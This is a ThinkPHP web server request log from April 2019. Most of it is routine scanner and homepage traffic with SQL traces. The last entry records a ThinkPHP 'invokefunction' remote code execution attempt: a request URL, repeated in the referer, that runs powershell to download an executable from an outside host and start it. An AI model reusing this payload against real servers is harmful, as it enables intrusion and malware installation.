@@ -1,0 +1,760 @@
+---------------------------------------------------------------
+[ 2019-04-05T02:09:20+08:00 ] 169.197.108.6 GET 47.92.113.32/version
+[运行时间：0.029845s] [吞吐率：33.51req/s] [内存消耗：2,152.13kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000021s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001819s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001834s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'version',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'kubectl/v1.12.0 (linux/amd64) kubernetes/0ed3388',
+  'host' => '47.92.113.32',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000101s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-04-05T02:09:20+08:00 ] 169.197.108.6 GET 47.92.113.32/version
+[运行时间：0.019219s] [吞吐率：52.03req/s] [内存消耗：2,152.17kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000019s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001901s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001915s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'kubectl/v1.12.0 (linux/amd64) kubernetes/0ed3388',
+  'host' => '47.92.113.32',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000100s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-04-05T02:09:24+08:00 ] 169.197.108.6 GET 47.92.113.32/
+[运行时间：0.042711s] [吞吐率：23.41req/s] [内存消耗：4,878.35kb] [文件加载：143]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000020s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001861s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001877s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'kubectl/v1.12.0 (linux/amd64) kubernetes/0ed3388',
+  'host' => '47.92.113.32',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001189s ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000144s ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000428s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000675s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000226s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000235s ]
+---------------------------------------------------------------
+[ 2019-04-05T02:26:47+08:00 ] 223.88.0.99 HEAD www.chinafeifang.com/
+[运行时间：0.042479s] [吞吐率：23.54req/s] [内存消耗：4,879.99kb] [文件加载：143]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000019s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001996s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002015s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.chinafeifang.com',
+  'accept' => '*/*',
+  'user-agent' => 'Chrome/57',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001238s ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000129s ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000396s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000668s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000238s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000208s ]
+---------------------------------------------------------------
+[ 2019-04-05T05:26:23+08:00 ] 111.19.33.73 HEAD www.chinafeifang.com/
+[运行时间：0.042567s] [吞吐率：23.49req/s] [内存消耗：4,879.99kb] [文件加载：143]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000023s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001892s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001914s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.chinafeifang.com',
+  'accept' => '*/*',
+  'user-agent' => 'Chrome/57',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001297s ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000160s ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000357s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000741s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000251s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000265s ]
+---------------------------------------------------------------
+[ 2019-04-05T08:10:37+08:00 ] 106.14.204.78 GET 47.92.113.32/
+[运行时间：0.041640s] [吞吐率：24.02req/s] [内存消耗：4,878.85kb] [文件加载：143]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000019s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001891s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001906s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'host' => '47.92.113.32',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001214s ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000138s ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000374s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000700s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000214s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000238s ]
+---------------------------------------------------------------
+[ 2019-04-05T08:14:30+08:00 ] 47.92.137.155 GET www.xlove99.top/
+[运行时间：0.044367s] [吞吐率：22.54req/s] [内存消耗：4,878.87kb] [文件加载：143]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000023s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002153s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002174s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'host' => 'www.xlove99.top',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001378s ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000161s ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000381s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000733s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000238s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000286s ]
+---------------------------------------------------------------
+[ 2019-04-05T08:33:51+08:00 ] 183.197.204.6 HEAD www.chinafeifang.com/
+[运行时间：0.043388s] [吞吐率：23.05req/s] [内存消耗：4,879.99kb] [文件加载：143]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000020s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001894s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001910s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.chinafeifang.com',
+  'accept' => '*/*',
+  'user-agent' => 'Chrome/57',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001278s ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000147s ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000385s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000710s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000217s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000240s ]
+---------------------------------------------------------------
+[ 2019-04-05T08:42:39+08:00 ] 185.234.217.128 GET 47.92.113.32/
+[运行时间：0.041040s] [吞吐率：24.37req/s] [内存消耗：4,878.95kb] [文件加载：143]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000020s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001791s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001807s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
+  'host' => '47.92.113.32',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001205s ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000137s ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000366s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000697s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000204s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000238s ]
+---------------------------------------------------------------
+[ 2019-04-05T10:12:33+08:00 ] 107.170.251.213 GET 47.92.113.32/
+[运行时间：0.041614s] [吞吐率：24.03req/s] [内存消耗：4,878.26kb] [文件加载：143]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000022s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001809s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001825s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
+  'host' => '47.92.113.32',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001313s ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000136s ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000366s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000645s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000212s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000218s ]
+---------------------------------------------------------------
+[ 2019-04-05T11:25:45+08:00 ] 183.225.139.119 HEAD www.chinafeifang.com/
+[运行时间：0.043902s] [吞吐率：22.78req/s] [内存消耗：4,879.99kb] [文件加载：143]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000024s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001892s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001907s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.chinafeifang.com',
+  'accept' => '*/*',
+  'user-agent' => 'Chrome/57',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001170s ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000156s ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000363s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000721s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000214s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000229s ]
+---------------------------------------------------------------
+[ 2019-04-05T14:32:20+08:00 ] 117.139.83.34 HEAD www.chinafeifang.com/
+[运行时间：0.042802s] [吞吐率：23.36req/s] [内存消耗：4,879.99kb] [文件加载：143]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000021s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001857s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001871s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.chinafeifang.com',
+  'accept' => '*/*',
+  'user-agent' => 'Chrome/57',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001211s ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000142s ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000388s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000671s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000221s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000236s ]
+---------------------------------------------------------------
+[ 2019-04-05T14:39:15+08:00 ] 139.162.113.204 GET 47.92.113.32/
+[运行时间：0.042410s] [吞吐率：23.58req/s] [内存消耗：4,877.34kb] [文件加载：143]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000022s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001942s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001958s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'user-agent' => 'HTTP Banner Detection (https://security.ipip.net)',
+  'host' => '47.92.113.32',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001340s ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000144s ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000372s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000660s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000218s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000224s ]
+---------------------------------------------------------------
+[ 2019-04-05T17:21:01+08:00 ] 117.153.206.164 HEAD www.chinafeifang.com/
+[运行时间：0.044109s] [吞吐率：22.67req/s] [内存消耗：4,879.99kb] [文件加载：143]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000023s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002025s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002043s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.chinafeifang.com',
+  'accept' => '*/*',
+  'user-agent' => 'Chrome/57',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001260s ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000152s ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000414s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000802s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000236s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000255s ]
+---------------------------------------------------------------
+[ 2019-04-05T19:42:44+08:00 ] 47.92.116.24 GET 47.92.113.32/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/ffxghxaevlbpgza9973.exe');start%20C:/Windows/temp/ffxghxaevlbpgza9973.exe
+[运行时间：0.020477s] [吞吐率：48.84req/s] [内存消耗：2,155.05kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000024s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001892s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001911s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '47.92.113.32',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'referer' => 'http://47.92.113.32:443/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'C:/Windows/temp/ffxghxaevlbpgza9973.exe\');start C:/Windows/temp/ffxghxaevlbpgza9973.exe',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'connection' => 'Keep-Alive',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000162s ]
